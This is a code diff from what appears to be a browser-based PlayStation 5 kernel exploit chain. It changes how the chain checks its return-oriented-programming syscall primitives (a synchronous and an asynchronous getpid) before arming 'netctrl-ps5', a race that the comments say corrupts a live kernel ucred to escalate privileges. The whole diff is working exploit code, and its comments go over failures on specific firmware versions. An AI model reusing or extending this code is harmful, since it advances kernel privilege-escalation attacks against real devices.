@@ -2199,26 +2199,53 @@ async function handoffToLapse() {
             await window.rop_worker.testStore();
             mark("ROPW-STORE-OK", "mov_qword_rdi_rax + pop_rax/pop_rdi good");
 
-            const r = await window.rop_worker.testGetpid();
-            mark("ROPW-GETPID", String(r.retval));
-            report("ropw_getpid", {pid: String(r.retval), ms: r.ms});
+            /* SYNC getpid first, deliberately.
+             *
+             * The async path reports only via the worker's postMessage echo, so
+             * "chain died" and "worker never got back to its message loop" look
+             * identical — which is exactly the ambiguity the 12.00 runs are
+             * stuck in (one attempt killed the renderer here, the next simply
+             * stopped with no further beacon). fireSync polls a DONE flag the
+             * CHAIN writes, so its timeout can tell those two apart.
+             *
+             * It is also the path that actually matters: netctrl-ps5 issues
+             * every syscall through syscallSync. Proving the async one first
+             * was only ever an artifact of the original bring-up order. */
+            mark("ROPW-GETPID-FIRING", "sync path, first syscall of the run");
+            const s0 = window.rop_worker.testGetpidSync();
+            mark("ROPW-GETPID-SYNC", String(s0.retval) + "-spins=" + s0.spins);
+            report("ropw_getpid_sync", {pid: String(s0.retval), spins: s0.spins});
 
-            /* Same call through the SYNCHRONOUS path (busy-poll, no await).
-               If this returns the same pid, netctrl-ps5.js keeps its
-               synchronous API and its race timing - no async refactor. */
+            /* The async getpid is a CROSS-CHECK, not a dependency — every
+             * syscall netctrl-ps5 issues goes through syscallSync. Wrap it so a
+             * timeout throw cannot discard the sync proof already in the log:
+             * on 12.00 this is the call that has been failing, and losing the
+             * whole run to it is what made the failure so hard to localise.
+             * (A renderer crash still cannot be caught, which is why the sync
+             * path now runs first rather than after it.) */
+            let r = null;
             try {
-                const s = window.rop_worker.testGetpidSync();
-                mark("ROPW-GETPID-SYNC", String(s.retval) + "-spins=" + s.spins);
-                report("ropw_getpid_sync",
-                       {pid: String(s.retval), spins: s.spins,
-                        match: String(s.retval === r.retval)});
+                r = await window.rop_worker.testGetpid();
+                mark("ROPW-GETPID", String(r.retval));
+                report("ropw_getpid", {pid: String(r.retval), ms: r.ms});
+            } catch (eAsync) {
+                mark("ROPW-GETPID-ASYNC-FAILED",
+                     String(eAsync && eAsync.message).slice(0, 90));
+                report("ropw_getpid", {error: String(eAsync && eAsync.message).slice(0, 140)});
+            }
+
+            try {
+                /* Arming still requires BOTH paths to agree, unchanged: the
+                   race is what corrupts a live ucred, so a primitive that is
+                   only half-proven must not reach it. */
+                const s = s0;
                 /* ARMED. The race only runs once BOTH getpid proofs pass, so a
                    broken primitive stops us before the kernel is touched.
                    netctrl-ps5 now issues every syscall through
                    rop_worker.syscallSync and allocates via get_backing_store -
                    window.syscall / window.call / window.malloc all route to
                    lapse-runtime's runChain, which is fatal on 10.00. */
-                if (s.retval === r.retval) {
+                if (r && s.retval === r.retval) {
                     mark("NETCTRL-ARMED", "primitive verified both ways");
                     try {
                         const ok = window.netctrl_ps5.run();
@@ -2233,7 +2260,8 @@ async function handoffToLapse() {
                         setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                     }
                 } else {
-                    mark("NETCTRL-NOT-ARMED", "sync/async pid mismatch");
+                    mark("NETCTRL-NOT-ARMED", r ? "sync/async pid mismatch"
+                                               : "async getpid never completed");
                     setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                 }
             } catch (e) {
